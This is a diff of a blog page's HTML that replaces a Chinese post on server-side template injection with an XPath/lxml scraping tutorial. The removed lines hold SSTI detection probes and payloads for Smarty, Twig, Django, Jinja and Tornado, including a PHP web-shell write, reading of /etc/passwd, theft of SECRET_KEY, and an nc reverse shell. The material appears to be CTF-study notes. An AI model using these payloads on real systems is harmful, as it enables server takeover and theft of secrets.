@@ -14,11 +14,11 @@
   <meta http-equiv="x-ua-compatible" content="ie=edge">
   
   <meta name="theme-color" content="#2f4154">
-  <meta name="description" content="ssti模板注入相关方法/解决问题">
+  <meta name="description" content="XPath是一门在 XML 文档中查找信息的语言">
   <meta name="author" content="OPN">
   <meta name="keywords" content="">
   
-  <title>SSTI模板注入 - OPN&#39;S BLOG</title>
+  <title>Python-XPath - OPN&#39;S BLOG</title>
 
   <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
 
@@ -163,7 +163,7 @@
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
           <div class="page-header text-center fade-in-up">
-            <span class="h2" id="subtitle" title="SSTI模板注入">
+            <span class="h2" id="subtitle" title="Python-XPath">
               
             </span>
 
@@ -173,8 +173,8 @@
   
     <span class="post-meta">
       <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-      <time datetime="2022-02-23 19:18" pubdate>
-        2022年2月23日 晚上
+      <time datetime="2022-09-14 12:02" pubdate>
+        2022年9月14日 中午
       </time>
     </span>
   
@@ -185,7 +185,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      757 字
+      603 字
     </span>
   
 
@@ -195,7 +195,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      9
+      8
        分钟
     </span>
   
@@ -233,74 +233,92 @@
         <div class="py-5" id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">SSTI模板注入</h1>
+            <h1 style="display: none">Python-XPath</h1>
             
               <p class="note note-info">
                 
-                  本文最后更新于：6 个月前
+                  本文最后更新于：几秒前
                 
               </p>
             
             <div class="markdown-body">
-              <p>ssti模板注入相关方法/解决问题</p>
+              <p>XPath是一门在 XML 文档中查找信息的语言</p>
 <span id="more"></span>
 
-<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>简单了解了一下ssti原理  </p>
-<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/aef2ae0498df">SSTI链接</a>  </p>
-<p><a target="_blank" rel="noopener" href="https://jiang-niao.github.io/2020/04/02/SSTi%20%E5%85%A8%E8%A7%A3%E6%9E%90/#SSTi-%E5%AD%A6%E4%B9%A0%EF%BC%88%E5%BE%85%E6%9B%B4%E6%96%B0%EF%BC%89">SSTi 学习</a>  </p>
-<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/188172">SSTI/沙盒逃逸详细总结 </a>     </p>
-<p>简单来说， 当用户的输入数据没有被合理的处理控制时，就有可能数据插入了程序段中变成了程序的一部分，从而改变了程序的执行逻辑</p>
-<p>SSTI也是获取了一个输入，然后再后端的渲染处理上进行了语句的拼接，然后执行。当然还是和sql注入有所不同的，SSTI利用的是现在的网站模板引擎，主要针对python、php、java的一些网站处理框架，比如Python的jinja2 mako tornado django，php的smarty twig，java的jade velocity。当这些框架对运用渲染函数生成html的时候会出现SSTI的问题</p>
-<h2 id="模板引擎"><a href="#模板引擎" class="headerlink" title="模板引擎"></a>模板引擎</h2><p>模板引擎（这里特指用于Web开发的模板引擎）是为了使用户界面与业务数据（内容）分离而产生的，它可以生成特定格式的文档，用于网站的模板引擎就会生成一个标准的HTML文档</p>
-<p>模板引擎可以让（网站）程序实现界面与数据分离，业务代码与逻辑代码的分离，这就大大提升了开发效率，良好的设计也使得代码重用变得更加容易</p>
-<p>利用模板引擎来生成前端的html代码，模板引擎会提供一套生成html代码的程序，然后只需要获取用户的数据，然后放到渲染函数里，然后生成模板+用户数据的前端html页面，然后反馈给浏览器，呈现在用户面前</p>
-<p>模板引擎也会提供沙箱机制来进行漏洞防范，但是可以用沙箱逃逸技术来进行绕过</p>
-<h2 id="检测流程"><a href="#检测流程" class="headerlink" title="检测流程"></a>检测流程</h2><p><img src="/2022/02/23/ssti/ssti-1.png" srcset="/img/loading.gif" lazyload></p>
-<div class="hljs code-wrapper"><pre><code>首先输入&#123;&#123;7*7&#125;&#125;，返回值为49则表明存在SSTI
-
-输入&#123;&#123;system('cat /etc/passwd')&#125;&#125;如果返回值则表明为Smarty模板引擎
-
-输入&#123;&#123;7*'7'&#125;&#125;如果返回值是49则为Twig模板引擎
-
-如果返回值是7777777则为JinJa模板引擎
+<h2 id="Python-XPath"><a href="#Python-XPath" class="headerlink" title="Python-XPath"></a>Python-XPath</h2><h3 id="1、什么是xpath"><a href="#1、什么是xpath" class="headerlink" title="1、什么是xpath"></a>1、什么是xpath</h3><p>XPath 使用路径表达式在 XML 文档中进行导航<br>XPath 包含一个标准函数库<br>XPath 是 XSLT 中的主要元素<br>XPath 是一个 W3C 标准  </p>
+<p>其实XPath就是一门在 XML 文档中查找信息的语言。XPath用于在 XML 文档中通过元素和属性进行导航。</p>
+<h3 id="2、安装"><a href="#2、安装" class="headerlink" title="2、安装"></a>2、安装</h3><div class="hljs code-wrapper"><pre><code>pip install lxml
 </code></pre></div>
-<h2 id="姿势总结"><a href="#姿势总结" class="headerlink" title="姿势总结"></a>姿势总结</h2><h3 id="Smarty"><a href="#Smarty" class="headerlink" title="Smarty"></a>Smarty</h3><p>payload:</p>
-<div class="hljs code-wrapper"><pre><code>&#123;self::getStreamVariable(&quot;file:///etc/passwd&quot;)&#125;
+<h3 id="3、xpath语法"><a href="#3、xpath语法" class="headerlink" title="3、xpath语法"></a>3、xpath语法</h3><h4 id="3-1、选取节点"><a href="#3-1、选取节点" class="headerlink" title="3.1、选取节点"></a>3.1、选取节点</h4><p>XPath使用路径表达式在XML文档种选取节点。  </p>
+<p>节点包括元素，属性，和内容</p>
+<div class="hljs code-wrapper"><pre><code>html ---&gt; &lt;html&gt; ...&lt;/html&gt;
 
-&#123;Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,&quot;&lt;?php passthru($_GET[&#39;cmd&#39;]); ?&gt;&quot;,self::clearConfig())&#125;
+div ---&gt; &lt;div&gt; ...&lt;/div&gt;
 
-&#123;literal&#125;alert(&#39;xss&#39;);&#123;/literal&#125;
-
-&#123;if readfile(&#39;/flag&#39;)&#125;&#123;/if&#125;
-
-/////
-&#123;&#123;_self.env.registerUndefinedFilterCallback("exec")&#125;&#125;&#123;&#123;_self.env.getFilter("cat /flag")&#125;&#125;
+a  ---&gt; &lt;a&gt; ...&lt;/a&gt;
 </code></pre></div>
-<h3 id="Twig"><a href="#Twig" class="headerlink" title="Twig"></a>Twig</h3><p>payload:</p>
-<div class="hljs code-wrapper"><pre><code>&#123;self::getStreamVariable(&quot;file:///etc/passwd&quot;)&#125;
+<p>这里的元素和html中的标签一个意思。单独的元素是无法表达一个路径的，所以单独的元素不能独立使用</p>
+<p>节点是通过沿着路径或者step来选取的</p>
+<div class="hljs code-wrapper"><pre><code>/   根节点，节点分隔符，
 
-&#123;Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,&quot;&lt;?php passthru($_GET[&#39;cmd&#39;]); ?&gt;&quot;,self::clearConfig())&#125;
+//  任意位置
 
-&#123;literal&#125;alert(&#39;xss&#39;);&#123;/literal&#125;
+.   当前节点
 
-&#123;if readfile(&#39;/flag&#39;)&#125;&#123;/if&#125;
+..  父级节点
+
+@   属性
 </code></pre></div>
-<h3 id="Django"><a href="#Django" class="headerlink" title="Django"></a>Django</h3><p>payload:</p>
-<div class="hljs code-wrapper"><pre><code>&#123;user.groups.model._meta.app_config.module.admin.settings.SECRET_KEY&#125;
-&#123;user.user_permissions.model._meta.app_config.module.admin.settings.SECRET_KEY&#125;
+<p>谓语</p>
+<div class="hljs code-wrapper"><pre><code>//a[n] n为大于零的整数，代表子元素排在第n个位置的&lt;a&gt;元素
+
+//a[last()]   last()  代表子元素排在最后个位置的&lt;a&gt;元素
+
+//a[last()-]  和上面同理，代表倒数第二个
+
+//a[position()&lt;3] 位置序号小于3，也就是前两个，这里我们可以看出xpath中的序列是从1开始
+
+//a[@href]    拥有href的&lt;a&gt;元素
+
+//a[@href=&#39;www.baidu.com&#39;]    href属性值为&#39;www.baidu.com&#39;的&lt;a&gt;元素
+
+//book[@price&gt;2]   price值大于2的&lt;book&gt;元素
 </code></pre></div>
-<h3 id="Jinja"><a href="#Jinja" class="headerlink" title="Jinja"></a>Jinja</h3><p>payload:</p>
-<div class="hljs code-wrapper"><pre><code>&#123;&#123; ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evil', 'w').write('from os import system%0aSHELL = system') &#125;&#125;
-//写文件
-&#123;&#123; config.from_pyfile('/tmp/evil') &#125;&#125;
-//加载system
-&#123;&#123; config['SHELL']('nc xxxx xx -e /bin/sh') &#125;&#125;
-//执行命令反弹SHELL
+<h3 id="etree-HTML-html"><a href="#etree-HTML-html" class="headerlink" title="etree.HTML(html)"></a>etree.HTML(html)</h3><div class="hljs code-wrapper"><pre><code>from lxml import etree # 报红忽略
+
+url=...
+html=requests.get(html).decode(&#39;utf-8&#39;)
+etree.HTML(html)
 </code></pre></div>
-<h3 id="Tornado"><a href="#Tornado" class="headerlink" title="Tornado"></a>Tornado</h3><p>payload:</p>
-<div class="hljs code-wrapper"><pre><code>http://ip:port/opn90?msg=&#123;&#123;handler.settings&#125;&#125;
+<h3 id="xpath-函数"><a href="#xpath-函数" class="headerlink" title="xpath 函数"></a>xpath 函数</h3><p><a target="_blank" rel="noopener" href="https://www.w3school.com.cn/xpath/xpath_functions.asp">https://www.w3school.com.cn/xpath/xpath_functions.asp</a></p>
+<h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><div class="hljs code-wrapper"><pre><code>&lt;ul class=&quot;zxxx_list&quot;&gt;
+
+    &lt;li&gt;  &lt;a href=&quot;7c34a65595744227bdae8a35d68de133.shtml&quot; target=&quot;_blank&quot; title=&#39;截至9月13日24时&#39;  &gt;截至9月13日24时&lt;/a&gt;&lt;span class=&quot;ml&quot;&gt;2022-09-14&lt;/span&gt;&lt;/li&gt;
+&lt;/ul&gt;
 </code></pre></div>
-<p><a target="_blank" rel="noopener" href="https://err0r.top/article/ssti/">附：https://err0r.top/article/ssti/</a></p>
+<hr>
+<div class="hljs code-wrapper"><pre><code>#!/usr/bin/python
+# coding=utf-8
+from lxml import html
+from lxml import etree
+import requests
+
+url=&#39;&#39;
+
+a = requests.session()          # session建立连接
+html1 = a.get(url).content.decode(&#39;utf-8&#39;)
+print(html1)
+
+html2=etree.HTML(html1,parser = etree.HTMLParser(encoding=&#39;utf8&#39;))
+
+print(html2.xpath(&#39;//ul[@class=&quot;zxxx_list&quot;]/li/a/@href&#39;)[0])
+# 查找类名为zxxx_list的ul 向下查找li/a 获取a的href 获取第一项
+</code></pre></div>
+<p>===&gt;</p>
+<div class="hljs code-wrapper"><pre><code>7c34a65595744227bdae8a35d68de133.shtml
+</code></pre></div>
+<p>参考：<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/mxjhaima/p/13775844.html">https://www.cnblogs.com/mxjhaima/p/13775844.html</a></p>
+<p>语法参考：<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_50854790/article/details/123610184">https://blog.csdn.net/qq_50854790/article/details/123610184</a></p>
 
             </div>
             <hr>
@@ -311,7 +329,7 @@
                   <div class="post-meta">
                     <i class="iconfont icon-tags"></i>
                     
-                      <a class="hover-with-bg" href="/tags/web-ssti/">web ssti</a>
+                      <a class="hover-with-bg" href="/tags/XPath/">XPath</a>
                     
                   </div>
                 
@@ -328,18 +346,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2022/02/28/Docker/">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">Docker</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2022/02/21/Unserialize-ways/">
-                        <span class="hidden-mobile">Unserialize-ways</span>
+                      <a href="/2022/04/10/LeetCode/">
+                        <span class="hidden-mobile">LeetCode</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
